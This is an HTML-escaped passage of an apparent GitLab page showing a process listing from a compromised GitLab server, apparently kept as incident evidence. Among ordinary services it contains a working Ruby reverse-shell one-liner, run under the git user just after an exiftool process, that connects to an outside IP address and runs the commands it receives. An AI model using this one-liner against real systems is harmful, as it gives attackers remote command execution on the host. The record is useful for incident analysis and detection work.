-\u0026gt; /process 10.219.1.9 - - [07/Apr/2021:13:13:58 UTC] \&quot;GET /process HTTP/1.1\&quot; 200 153 - -\u0026gt; /process 10.219.1.10 - - [07/Apr/2021:13:14:09 UTC] \&quot;GET /process HTTP/1.1\&quot; 200 153 - -\u0026gt; /process 10.219.1.9 - - [07/Apr/2021:13:14:13 UTC] \&quot;GET /process HTTP/1.1\&quot; 200 153 - -\u0026gt; /process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC155\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit       1594 50.1  2.0 2843912 1351680 ?     Sl   12:40  17:00 puma: cluster worker 0: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC156\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003emessage+  1599  0.0  0.0  43028  3356 ?        Ss    2020   1:36 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC157\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1615  0.0  0.0   4240  1200 ?        Ss    2020   0:26 runsv apt_metrics  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC158\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1617  0.0  0.0   4240  1104 ?        Ss    2020   0:03 runsv node_exporter  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC159\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1618  0.0  0.0   4240  1104 ?        Ss    2020   4:24 runsv ntpd_metrics  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC160\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1620  0.0  0.0   4240   380 ?        Ss    2020   0:00 runsv gitlab-monitor  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC161\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1621  0.0  0.0   4240   388 ?        Ss    2020   0:00 runsv mtail  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC162\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1623  0.0  0.0      0     0 ?        I\u0026lt;    2020  15:18 [kworker/0:1H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC163\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1624  0.0  0.0   4384   252 ?        S     2020   0:04 svlogd -tt /var/log/mtail  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC164\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1625  0.0  0.0   4384   380 ?        S     2020   0:00 svlogd -tt /var/log/prometheus/node_exporter_apt_metrics  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC165\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1626  0.0  0.0   4384   224 ?        S     2020   0:00 svlogd -tt /var/log/prometheus/node_exporter_ntpd_metrics  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC166\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1627  0.0  0.0   4384   236 ?        S     2020   0:02 svlogd -tt /var/log/prometheus/node_exporter  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC167\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1628  0.0  0.0   4384   240 ?        S     2020   0:00 svlogd -tt /var/log/gitlab-monitor  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC168\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1713  0.0  0.0  13372   908 ?        Ss    2020   0:02 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC169\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1716  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:46 [kworker/14:1H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC170\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1844  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:00 [nfsiod]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC171\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1850  0.0  0.0 277088  2224 ?        Ssl   2020   0:36 /usr/lib/policykit-1/polkitd --no-debug  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC172\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      1878  0.0  0.0      0     0 ?        I\u0026lt;    2020   5:54 [kworker/2:1H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC173\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2084  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/6:0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC174\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2095  0.0  0.0  65512  3084 ?        Ss    2020   0:04 /usr/sbin/sshd -D  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC175\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2102  0.0  0.0      0     0 ?        I\u0026lt;    2020   2:31 [kworker/9:1H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC176\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2120  0.0  0.0      0     0 ?        I\u0026lt;    2020   5:08 [kworker/3:1H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC177\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2138  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:31 [kworker/15:1H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC178\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2146  0.0  0.0      0     0 ?        I\u0026lt;    2020  23:45 [kworker/1:1H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC179\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2151  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:40 [kworker/4:1H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC180\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2167  0.0  0.0  14656  1372 tty1     Ss+   2020   0:00 /sbin/agetty --noclear tty1 linux  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC181\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2177  0.0  0.0  14472  1556 ttyS0    Ss+   2020   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC182\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003entp       2204  0.0  0.0  40268  2576 ?        Ss    2020  21:06 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -c /var/lib/ntp/ntp.conf.dhcp -u 112:116  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC183\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2270  0.0  0.0  67480 18788 ?        Ss    2020  17:03 /usr/bin/python3 /usr/bin/google_ip_forwarding_daemon  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC184\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2272  0.0  0.0  67220 16368 ?        Ss    2020  10:50 /usr/bin/python3 /usr/bin/google_clock_skew_daemon  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC185\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2402  0.0  0.0  65408  2460 ?        Ss    2020   1:05 /usr/lib/postfix/sbin/master  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC186\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003epostfix   2411  0.0  0.0  67640  1988 ?        S     2020   0:23 qmgr -l -t fifo -u  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC187\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2571  0.0  0.0   4392   848 ?        Ss    2020   2:50 runsvdir -P /opt/gitlab/service log: ...........................................................................................................................................................................................................................................................................................................................................................................................................  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC188\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2618  0.0  0.0   4240  1104 ?        Ss    2020   0:01 runsv puma  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC189\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2621  0.0  0.0   4240  1192 ?        Ss    2020   0:05 runsv logrotate  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC190\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2623  0.0  0.0   4240  1144 ?        Ss    2020   0:00 runsv nginx  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC191\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      2625  0.0  0.0   4240  1092 ?        Ss    2020   0:01 runsv gitlab-workhorse  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC192\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  3150  0.0  0.0 754368 26924 ?        Sl   Feb17  35:28 /opt/ruby-2.7.0/bin/ruby /opt/gitlab-monitor/bin/gitlab-mon web -c /opt/gitlab-monitor/config/worker-config.yml  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC193\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      3164  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:12 [kworker/11:1H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC194\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      3211  0.2  0.0      0     0 ?        I    12:42   0:04 [kworker/u32:2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC195\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      3222  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:15 [kworker/7:1H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC196\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      3463  0.0  0.0      0     0 ?        I    10:35   0:00 [kworker/5:1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC197\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      3511  0.0  0.0      0     0 ?        I    11:40   0:00 [kworker/12:0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC198\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      4032  0.0  0.1 1571276 107596 ?      Ssl   2020 172:34 /opt/prometheus/ebpf_exporter/ebpf_exporter --web.listen-address=:9435 --config.file=/opt/prometheus/ebpf_exporter/config.yml  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC199\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      4171  0.0  0.0   4376   640 ?        S    13:12   0:00 sleep 600  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC200\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      4302  0.0  0.0      0     0 ?        I\u0026lt;    2020   2:25 [kworker/5:1H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC201\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      4391  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:14 [kworker/8:1H]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC202\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      4699  0.0  0.0      0     0 ?        I    11:09   0:00 [kworker/13:2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC203\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      4812  0.0  0.0   4376   672 ?        S    13:13   0:00 sleep 60  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC204\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      5375  0.0  0.0   4504   788 ?        Ss   13:13   0:00 /bin/sh /opt/gitlab/embedded/bin/gitlab-logrotate-wrapper  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC205\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      5379  0.0  0.0   4376   748 ?        S    13:13   0:00 sleep 600  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC206\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit       5398 49.7  1.9 2661404 1274712 ?     Sl   12:44  14:43 puma: cluster worker 3: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC207\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit       5544  1.3  0.0  45604 27664 ?        S    13:14   0:00 /usr/bin/perl -w /opt/gitlab/embedded/bin/exiftool -all= --IPTC:all --XMP-iptcExt:all -tagsFromFile @ -ResolutionUnit -XResolution -YResolution -YCbCrSubSampling -YCbCrPositioning -BitsPerSample -ImageHeight -ImageWidth -ImageSize -Copyright -CopyrightNotice -Orientation -  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC208\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit       5545  0.0  0.0      0     0 ?        Z    13:14   0:00 [sh] \u0026lt;defunct\u0026gt;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC209\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit       5551  0.0  0.0 105260 10840 ?        S    13:14   0:00 ruby -rsocket -e exit if fork;c=TCPSocket.new(\&quot;103.3.61.137\&quot;,12345);while(cmd=c.gets);IO.popen(cmd,\&quot;r\&quot;){|io|c.print io.read}end  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC210\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit       5667  0.0  0.0   4504   740 ?        S    13:14   0:00 sh -c ps auxww  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC211\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit       5668  0.0  0.0  34424  2864 ?        R    13:14   0:00 ps auxww  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC212\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      5952  0.0  0.0      0     0 ?        I    00:24   0:00 [kworker/5:2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC213\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      6812  0.0  0.0  54640  7080 ?        Ss   Mar08   0:00 nginx: master process /opt/gitlab/embedded/sbin/nginx -p /var/opt/gitlab/nginx  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC214\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6813  0.0  0.0  59476 12544 ?        S    Mar08  18:42 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC215\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6814  0.0  0.0  59380 13704 ?        S    Mar08  18:28 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC216\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6815  0.0  0.0  59504 13088 ?        S    Mar08  18:57 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC217\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6816  0.0  0.0  59456 13048 ?        S    Mar08  19:35 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC218\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6817  0.0  0.0  59468 13396 ?        S    Mar08  18:41 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC219\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6818  0.0  0.0  59508 13700 ?        S    Mar08  20:20 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC220\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6819  0.0  0.0  59492 13220 ?        S    Mar08  19:33 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC221\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6820  0.0  0.0  59460 13420 ?        S    Mar08  22:00 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC222\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6821  0.0  0.0  59508 13420 ?        S    Mar08  24:15 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC223\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6822  0.0  0.0  59500 13348 ?        S    Mar08  20:53 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC224\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6823  0.0  0.0  59660 13588 ?        S    Mar08  27:47 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC225\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6824  0.0  0.0  59972 14116 ?        S    Mar08  37:52 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC226\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6825  4.0  0.0  63940 18592 ?        S    Mar08 1788:21 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC227\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6826  1.9  0.0  61436 15808 ?        S    Mar08 854:41 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC228\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6827  0.1  0.0  60120 14564 ?        S    Mar08  79:52 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC229\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6828  0.8  0.0  62348 16532 ?        S    Mar08 351:59 nginx: worker process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC230\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egitlab-+  6829  0.0  0.0  54836  3732 ?        S    Mar08   0:08 nginx: cache manager process  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC231\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit       6952 17.6  0.1 1532460 109784 ?      Ssl  10:04  33:35 /opt/gitlab/embedded/bin/gitlab-workhorse -listenNetwork unix -listenUmask 0 -listenAddr /var/opt/gitlab/gitlab-workhorse/sockets/socket -authBackend http://localhost:8080 -authSocket /var/opt/gitlab/gitlab-rails/sockets/gitlab.socket -documentRoot /opt/gitlab/embedded/service/gitlab-rails/public -pprofListenAddr  -apiLimit 5 -apiQueueDuration 60s -apiQueueLimit 200 -prometheusListenAddr 0.0.0.0:9229 -secretPath /opt/gitlab/embedded/service/gitlab-rails/.gitlab_workhorse_secret -logFormat json -config config.toml  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC232\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit       7369 10.3  1.5 1859556 1033020 ?     Ssl  10:04  19:41 puma 5.1.1 (unix:///var/opt/gitlab/gitlab-rails/sockets/gitlab.socket,tcp://0.0.0.0:8080) [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC233\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      7522  0.0  0.0      0     0 ?        I    10:04   0:00 [kworker/11:2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC234\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      8263  0.0  0.0      0     0 ?        I    12:15   0:00 [kworker/14:0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC235\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      8266  0.0  0.0      0     0 ?        I    08:19   0:00 [kworker/0:2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC236\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      8581  0.1  0.0      0     0 ?        I    12:48   0:02 [kworker/u32:1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC237\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot      9122  0.0  0.0      0     0 ?        I    10:37   0:00 [kworker/8:0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC238\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit       9978 47.0  2.0 3182348 1362056 ?     Sl   11:43  42:45 puma: cluster worker 8: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC239\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003econsul   10871  0.5  0.2 257480 143704 ?       Ssl   2020 2836:38 /opt/consul/1.7.2/consul agent -config-file=/etc/consul/consul.json -config-dir=/etc/consul/conf.d  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC240\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      10980 51.1  1.8 2507012 1229264 ?     Sl   12:49  12:43 puma: cluster worker 2: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC241\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003einfluxd+ 12182  0.0  0.0 188928  1044 ?        Ssl   2020   0:14 /usr/bin/influxdb-relay -config /etc/influxdb-relay/influxdb-relay.conf  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC242\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     12322  0.0  0.0      0     0 ?        I    12:49   0:00 [kworker/11:1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC243\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     12828  0.0  0.0   4384  1276 ?        S     2020   0:01 svlogd -tt /var/log/gitlab/puma  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC244\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     12831  0.2  0.0   4384  1228 ?        S     2020 1318:06 svlogd /var/log/gitlab/gitlab-workhorse  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC245\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     12853  0.0  0.0   4384  1260 ?        S     2020   0:02 svlogd -tt /var/log/gitlab/nginx  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC246\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     12856  0.0  0.0   4384   340 ?        S     2020   0:00 svlogd -tt /var/log/gitlab/logrotate  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC247\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      13196 48.0  2.1 2935068 1437312 ?     Sl   12:17  27:28 puma: cluster worker 10: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC248\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     13379  0.0  0.0      0     0 ?        I    09:53   0:00 [kworker/7:1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC249\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     13382  0.0  0.0      0     0 ?        I    09:53   0:00 [kworker/10:1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC250\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     13611  1.0  0.0 1740892 38864 ?       Ssl  Jan29 1042:19 /usr/bin/process-exporter --config.path /etc/process-exporter/chef-configured.yaml --web.listen-address=:9256 -threads=false -gather-smaps=false  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC251\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     14478  0.0  0.0      0     0 ?        I    09:24   0:00 [kworker/2:0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC252\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      17155 50.3  1.8 2541576 1218444 ?     Sl   12:50  11:50 puma: cluster worker 15: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC253\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     17904  0.0  0.0      0     0 ?        I    09:59   0:00 [kworker/2:2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC254\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      21109 48.3  1.9 2572804 1258580 ?     Sl   12:55   9:17 puma: cluster worker 5: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC255\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     21296  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/8:1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC256\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     21299  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/1:0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC257\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     21301  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/7:0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC258\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     21306  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/15:1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC259\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     21376  0.0  0.0      0     0 ?        I    09:59   0:00 [kworker/9:0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC260\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      21698 48.0  2.2 3093788 1459416 ?     Sl   12:26  23:00 puma: cluster worker 9: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC261\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     22003  0.2  0.0      0     0 ?        I    12:26   0:05 [kworker/u32:3]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC262\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     22131  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/9:2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC263\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     22135  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/4:2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC264\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     22142  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/12:3]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC265\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     22143  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/3:1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC266\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     22144  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/13:0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC267\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     22863  0.0  0.0 161112 54712 ?        Ssl  Jan18   0:15 /opt/chef/embedded/bin/ruby --disable-gems /usr/bin/chef-client -c /etc/chef/client.rb -i 1800 -s 300  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC268\&quot; 